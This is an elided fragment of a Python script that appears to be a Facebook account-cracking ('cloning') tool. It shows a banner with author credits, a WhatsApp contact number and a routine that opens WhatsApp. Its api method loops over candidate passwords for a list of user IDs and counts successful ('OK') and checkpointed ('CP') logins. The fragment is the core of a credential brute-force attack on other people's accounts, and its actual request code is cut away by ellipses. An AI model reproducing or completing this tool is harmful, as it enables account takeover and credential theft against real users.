...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +966 0531382117")
	subprocess.check_output(["am", "start", "https://wa.me/+966 0531382117"])
...
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 
 ...
 > \033[0;95mFACEBOOK ID   :  MD RAKIB
 HOSSEN
 > \033[0;41mWHATSAPP      : 0531382117
 \033[0;96m> YOUTUBE       : Rakib official
 > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MR RAKIB] : %s/%s -> \033[0;92m [ RAKIB-OK:%s ]- \033[0;93m[RAKIB-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
